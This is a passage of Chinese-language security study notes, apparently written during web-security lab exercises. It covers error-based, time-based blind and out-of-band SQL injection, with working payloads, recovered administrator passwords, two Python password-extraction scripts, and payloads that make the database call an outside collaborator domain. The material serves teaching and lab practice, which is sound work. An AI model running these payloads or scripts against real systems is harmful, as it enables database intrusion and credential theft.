<span class="subst">&#123;result_char&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pos, result_char <span class="comment"># 返回位置索引和最终确定的字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    主程序入口：管理并发任务和汇总结果。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 配置连接池限制：同时最多保持 10 个长连接，最大并发请求数为 20</span></span><br><span class="line">    limits = httpx.Limits(max_keepalive_connections=<span class="number">10</span>, max_connections=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建异步客户端上下文</span></span><br><span class="line">    <span class="comment"># http2=True 启用 HTTP/2 协议提高并发效率；verify=False 忽略 SSL 证书检查（实验环境常用）</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient(http2=<span class="literal">True</span>, limits=limits, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 列表推导式：为密码的每一个位置创建一个 find_char 协程任务</span></span><br><span class="line">        <span class="comment"># 这 20 个任务会被几乎同时提交，而不是一个接一个排队</span></span><br><span class="line">        tasks = [find_char(client, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, PASSWORD_LENGTH + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Starting concurrent Binary Search for <span class="subst">&#123;PASSWORD_LENGTH&#125;</span> characters...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用 asyncio.gather 并行执行所有任务，并等待它们全部返回结果</span></span><br><span class="line">        results = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 整理结果：gather 返回的顺序不一定固定，所以按 pos 位置排序</span></span><br><span class="line">        results.sort()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取排序后的字符，拼接成完整的字符串</span></span><br><span class="line">        password = <span class="string">&quot;&quot;</span>.join([char <span class="keyword">for</span> pos, char <span class="keyword">in</span> results])</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打印最终爆破出的密码</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Full Password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 启动异步事件循环执行 main 函数</span></span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure>
+
+<h3 id="基于错误消息的SQL注入数据提取"><a href="#基于错误消息的SQL注入数据提取" class="headerlink" title="基于错误消息的SQL注入数据提取"></a>基于错误消息的SQL注入数据提取</h3><p>就是在注入时，会提示错误消息，可以使查询更容易</p>
+<p>CAST() 函数： 允许将一种数据类型转成另一种，来引起报错 （字符限制也能用）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> example_column <span class="keyword">FROM</span> example_table) <span class="keyword">AS</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">如果我读取的数据是一个字符串，通过CAST 强制转整数可能会引起错误</span><br><span class="line">ERROR: invalid input syntax <span class="keyword">for</span> type <span class="type">integer</span>: &quot;Example data&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">看看报错消息</span><br><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>JmyJDuefpri5ybX<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = &#x27;</span><span class="number">5</span>JmyJDuefpri5ybX<span class="string">&#x27;&#x27;</span>. Expected  <span class="type">char</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>有一个未闭合的单引号</span><br><span class="line"></span><br><span class="line">确认闭合</span><br><span class="line"><span class="string">&#x27;--  //200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">尝试转数据类型来获取报错消息</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> <span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">INT</span>)<span class="comment">--  //提示需要布尔表达式</span></span><br><span class="line"><span class="string">&#x27; AND 1=CAST((SELECT 1) AS INT)--  //200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查用户名</span></span><br><span class="line"><span class="string">TrackingId=5JmyJDuefpri5ybX&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users) <span class="keyword">AS</span> <span class="type">INT</span>)<span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>由于字符限制，查询被截断了， 这里可以把cookie 的原始值删了，来增加空间</span><br><span class="line"></span><br><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT username FROM users) AS INT)--;</span></span><br><span class="line"><span class="string">//还是返回错误了，因为返回了多行数据，修改一下，只返回一行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TrackingId=&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="keyword">AS</span> <span class="type">INT</span>)<span class="comment">--;</span></span><br><span class="line">ERROR: invalid input syntax <span class="keyword">for</span> type <span class="type">integer</span>: &quot;administrator&quot;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>泄露了一个用户名 <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line"></span><br><span class="line">利用报错消息还泄露密码</span><br><span class="line">TrackingId<span class="operator">=</span><span class="string">&#x27; AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--</span></span><br><span class="line"><span class="string">//ERROR: invalid input syntax for type integer: &quot;n7qltqe59y4zl9ucynpe&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">administrator</span></span><br><span class="line"><span class="string">n7qltqe59y4zl9ucynpe</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>如果数据库在查询中发生错误并且处理掉，那将它的响应就没有任何区别。在这种情况下可以通过注入条件为真，来触发时间延迟</p>
+<p>比如在Microsoft SQL server 可通过下面的来触发时间延迟</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">10</span><span class="string">&#x27;--</span></span><br><span class="line"><span class="string">// 1=2 条件为假，不触发</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>; IF (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) WAITFOR DELAY <span class="string">&#x27;0:0:10&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 条件为真，触发<span class="number">10</span>秒延迟</span><br></pre></td></tr></table></figure>
+
+<p>其他数据库类型的写法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Oracle       <span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE) <span class="keyword">THEN</span> <span class="string">&#x27;a&#x27;</span><span class="operator">||</span>dbms_pipe.receive_message((<span class="string">&#x27;a&#x27;</span>),<span class="number">10</span>) <span class="keyword">ELSE</span> <span class="keyword">NULL</span> <span class="keyword">END</span> <span class="keyword">FROM</span> dual</span><br><span class="line">Microsoft    IF (YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE) WAITFOR DELAY <span class="string">&#x27;0:0:10&#x27;</span></span><br><span class="line">PostgreSQL   <span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE) <span class="keyword">THEN</span> pg_sleep(<span class="number">10</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span></span><br><span class="line">MySQL        <span class="keyword">SELECT</span> IF(YOUR<span class="operator">-</span><span class="keyword">CONDITION</span><span class="operator">-</span>HERE,SLEEP(<span class="number">10</span>),<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">测试是否延迟</span><br><span class="line">TrackingId<span class="operator">=</span>IgW6A4NSM0ymuFE5<span class="string">&#x27;%3bSELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;</span></span><br><span class="line"><span class="string">//要自己url加密才能过，用明文不行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">确认是否存在adminstrator</span></span><br><span class="line"><span class="string">x&#x27;</span><span class="operator">%</span><span class="number">3</span>bSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">%</span><span class="number">3</span>d<span class="string">&#x27;administrator&#x27;</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">5</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">测试administrator密码有多少字符</span><br><span class="line">x<span class="string">&#x27;%3bSELECT+CASE+WHEN+(username%3d&#x27;</span>administrator<span class="string">&#x27;+AND+LENGTH(password)=20)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆密码</span></span><br><span class="line"><span class="string">x&#x27;</span><span class="operator">%</span><span class="number">3</span>bSELECT<span class="operator">+</span><span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(username<span class="operator">%</span><span class="number">3</span>d<span class="string">&#x27;administrator&#x27;</span><span class="operator">+</span><span class="keyword">AND</span><span class="operator">+</span><span class="built_in">SUBSTRING</span>(password,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>pg_sleep(<span class="number">5</span>)<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>pg_sleep(<span class="number">0</span>)<span class="operator">+</span><span class="keyword">END</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users<span class="comment">--</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这里主要看响应时间最长的</span><br><span class="line">第<span class="number">1</span>位：<span class="number">0</span></span><br><span class="line"></span><br><span class="line">x<span class="string">&#x27;%3bSELECT+CASE+WHEN+(username%3d&#x27;</span>administrator<span class="string">&#x27;+AND+SUBSTRING(password,2,1)=&#x27;</span>a<span class="string">&#x27;)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--</span></span><br><span class="line"><span class="string">第2位：k</span></span><br><span class="line"><span class="string">....</span></span><br><span class="line"><span class="string">最终密码:0k67ziygusvbca4xw9c7</span></span><br></pre></td></tr></table></figure>
+
+<p>串行二分查找脚本，这里不推荐使用多线程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx  <span class="comment"># 导入 httpx 库，用于发送异步 HTTP 请求</span></span><br><span class="line"><span class="keyword">import</span> asyncio <span class="comment"># 导入 asyncio，用于管理异步事件循环和任务切换</span></span><br><span class="line"><span class="keyword">import</span> time    <span class="comment"># 导入 time 库，用于精确计算请求耗时</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="comment"># 从 urllib 导入 quote，用于对 SQL Payload 进行 URL 编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 配置区 ---</span></span><br><span class="line"><span class="comment"># 实验环境的目标 URL</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;https://xxxxx/&quot;</span></span><br><span class="line"><span class="comment"># 维持登录状态或实验进度的 Session Cookie</span></span><br><span class="line">SESSION_COOKIE = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"><span class="comment"># 注入点 TrackingId 的初始前缀值（根据抓包结果设置）</span></span><br><span class="line">TRACKING_ID_BASE = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"><span class="comment"># 目标密码的长度，实验通常固定为 20 位</span></span><br><span class="line">PASSWORD_LENGTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># 触发数据库延时的秒数（pg_sleep 的参数）</span></span><br><span class="line">SLEEP_TIME = <span class="number">3</span></span><br><span class="line"><span class="comment"># 耗时判断阈值：如果请求返回时间超过 2.5s，我们就认为 SQL 语句中的 pg_sleep 被执行了</span></span><br><span class="line">THRESHOLD = <span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 核心判断逻辑 ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check_condition</span>(<span class="params">client, pos, mid</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    核心逻辑：通过时间延迟判断第 pos 位字符的 ASCII 码是否大于 mid。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 构造原始 SQL Payload：</span></span><br><span class="line">    <span class="comment"># 逻辑：截取 password 第 pos 位转为 ASCII，若大于 mid，则让数据库睡眠 SLEEP_TIME 秒，否则睡眠 0 秒。</span></span><br><span class="line">    raw_payload = <span class="string">f&quot;&#x27;;SELECT CASE WHEN (username=&#x27;administrator&#x27; AND ASCII(SUBSTRING(password,<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>) THEN pg_sleep(<span class="subst">&#123;SLEEP_TIME&#125;</span>) ELSE pg_sleep(0) END FROM users--&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对 Payload 进行 URL 编码，将特殊字符（如 ; &#x27; ( )）转换为服务器能识别的 %xx 格式</span></span><br><span class="line">    encoded_payload = quote(raw_payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造包含注入 Payload 的 Cookies 字典</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;TrackingId&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;TRACKING_ID_BASE&#125;</span><span class="subst">&#123;encoded_payload&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;session&quot;</span>: SESSION_COOKIE</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 记录请求发送前的时间戳</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送异步 GET 请求。timeout 设置为 20s 是为了确保能等完 pg_sleep 的延时</span></span><br><span class="line">        <span class="keyword">await</span> client.get(TARGET_URL, cookies=cookies, timeout=<span class="number">20.0</span>)</span><br><span class="line">        <span class="comment"># 计算请求返回所消耗的总时间</span></span><br><span class="line">        duration = time.time() - start</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果耗时大于等于阈值，返回 True（代表判断条件成立），否则返回 False</span></span><br><span class="line">        <span class="keyword">return</span> duration &gt;= THRESHOLD</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 捕获网络异常（如超时、断网等），防止脚本中断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Request error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">find_char_serially</span>(<span class="params">client, pos</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    二分查找算法实现：在 ASCII 32 到 126 范围内查找第 pos 位的准确字符。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    low = <span class="number">32</span>   <span class="comment"># 二分查找下限：ASCII 可打印字符起始值（空格）</span></span><br><span class="line">    high = <span class="number">126</span> <span class="comment"># 二分查找上限：ASCII 可打印字符结束值（~）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        <span class="comment"># 当 low 追上 high 时，说明查找范围已缩小到唯一确定的点</span></span><br><span class="line">        <span class="keyword">if</span> low == high:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(low)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 取中间值进行探测</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用判断函数：询问“该位置字符 ASCII 是否大于中间值？”</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">await</span> check_condition(client, pos, mid):</span><br><span class="line">            <span class="comment"># 如果大于，说明目标字符在右侧区间，更新下限</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果不大于，说明目标字符就在左侧区间（含 mid 本身），更新上限</span></span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 每一轮二分判断后强制微休 0.1s，缓解服务器压力，防止因连续请求导致的误报</span></span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环结束，返回最终确定的字符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(low)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    主控制流：配置客户端并启动循环探测。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 限制连接池：max_connections=1 强制所有请求串行发送，这是时间盲注最稳妥的做法</span></span><br><span class="line">    limits = httpx.Limits(max_keepalive_connections=<span class="number">1</span>, max_connections=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化异步客户端，开启 HTTP/2 支持，忽略 SSL 验证（verify=False）</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient(http2=<span class="literal">True</span>, limits=limits, verify=<span class="literal">False</span>) <span class="keyword">as</span> client:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Starting Stable Serial Binary Search...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Password Length: <span class="subst">&#123;PASSWORD_LENGTH&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        password = <span class="string">&quot;&quot;</span> <span class="comment"># 用于存放最终拼接出的密码字符串</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 外层循环：根据设定的长度，一位一位地破解</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, PASSWORD_LENGTH + <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 实时更新控制台当前位置信息，\r 表示不换行回到行首</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Cracking position <span class="subst">&#123;i&#125;</span>...&quot;</span>, end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 调用二分查找函数获取该位置字符</span></span><br><span class="line">            char = <span class="keyword">await</span> find_char_serially(client, i)</span><br><span class="line">            <span class="comment"># 将新找到的字符拼接到结果中</span></span><br><span class="line">            password += char</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打印当前已破解出来的部分密码</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Position <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;char&#125;</span> | Current password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 所有位置破解完成，输出最终结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n\n[!] Success! Final Password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 使用 asyncio 运行 main 协程，进入异步执行环境</span></span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure>
+
+<h3 id="OAST-外带盲注"><a href="#OAST-外带盲注" class="headerlink" title="OAST 外带盲注"></a>OAST 外带盲注</h3><p>当程序使用异步执行，用多条线程来执行任务时，上面的所有注入均无响应。在这种情况下可以利用外带网络交互来注入，且返回数据。（通常使用DNS）</p>
+<blockquote>
+<p>这里需要用到burp suite 专业版的 collaborator</p>
+</blockquote>
+<p>DNS 查询：让数据库对外部域名DNS查询 ，主要查询是否能外带，且存不存在漏洞</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Oracle</span><br><span class="line">  适用于XXE漏洞             <span class="keyword">SELECT</span> EXTRACTVALUE(xmltype(<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#x27;</span>),<span class="string">&#x27;/l&#x27;</span>) <span class="keyword">FROM</span> dual</span><br><span class="line">  进行补漏洞丁了就用这个     <span class="keyword">SELECT</span> UTL_INADDR.get_host_address(<span class="string">&#x27;BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Microsoft     <span class="keyword">exec</span> master..xp_dirtree <span class="string">&#x27;//BURP-COLLABORATOR-SUBDOMAIN/a&#x27;</span></span><br><span class="line">PostgreSQL    <span class="keyword">copy</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>) <span class="keyword">to</span> program <span class="string">&#x27;nslookup BURP-COLLABORATOR-SUBDOMAIN&#x27;</span></span><br><span class="line">Mysql         LOAD_FILE(<span class="string">&#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#x27;</span>)</span><br><span class="line">              <span class="keyword">SELECT</span> ... <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Oracle XXE漏洞的示范</span><br><span class="line"><span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//6ahl81dqakatni3g0mrzuu9rnit9hz5o.oastify.com/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">返回内容：</span></span><br><span class="line"><span class="string">     The Collaborator server received a DNS lookup of type AAAA for the domain name</span></span><br><span class="line"><span class="string">     v7kmkpg1rb348mvm8vqb.tli8joodl7lgy5e3b92m5hkey54wsngc.oastify.com.</span></span><br><span 